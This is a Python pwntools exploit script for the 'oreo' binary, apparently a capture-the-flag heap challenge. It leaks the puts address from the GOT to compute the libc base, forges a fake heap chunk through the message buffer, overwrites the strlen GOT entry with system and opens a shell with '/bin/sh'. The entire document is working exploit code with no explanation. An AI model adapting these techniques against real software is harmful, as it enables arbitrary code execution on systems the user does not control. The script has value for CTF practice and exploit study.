from pwn import *

context(arch='i386', os='linux', log_level='debug')

r = process('/home/h3rmesk1t/oreo')
elf = ELF('/home/h3rmesk1t/oreo')
libc = ELF('/home/h3rmesk1t/libc.so.6')

def add_rifle(name, description):
    r.sendline(b'1')
    r.sendline(name)
    r.sendline(description)

def show_rifle():
    r.sendline(b'2')
    r.recvuntil(b'===================================\n')

def order_rifle():
    r.sendline(b'3')

def level_message(message):
    r.sendline(b'4')
    r.sendline(message)


name = b'a' * 27 + p32(elf.got['puts'])
description = b'b' * 25
add_rifle(name, description)
show_rifle()

r.recvuntil(b'Description: ')
r.recvuntil(b'Description: ')

puts_addr = u32(r.recvuntil('\n', drop=True)[:4])
log.success('puts address: ' + hex(puts_addr))
libc_base = puts_addr - libc.symbols['puts']
sys_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

num = 1
while num < 0x3f:
    add_rifle(b'a' * 27 + p32(0), b'b' * 25)
    num += 1
payload = b'a' * 27 + p32(0x804A2A8)
add_rifle(payload, b'b' * 25)

payload = b'\x00' * 0x20 + p32(40) + p32(0x100)
payload = payload.ljust(52, b'a')
payload += p32(0)
payload = payload.ljust(128, b'a')
level_message(payload)
order_rifle()

payload = p32(elf.got['strlen']).ljust(20, b'a')
add_rifle(b'a' * 20, payload)
# gdb.attach(r)
log.success('system addr: ' + hex(sys_addr))
# gdb.attach(r)
level_message(p32(sys_addr) + b';/bin/sh\x00')

r.interactive()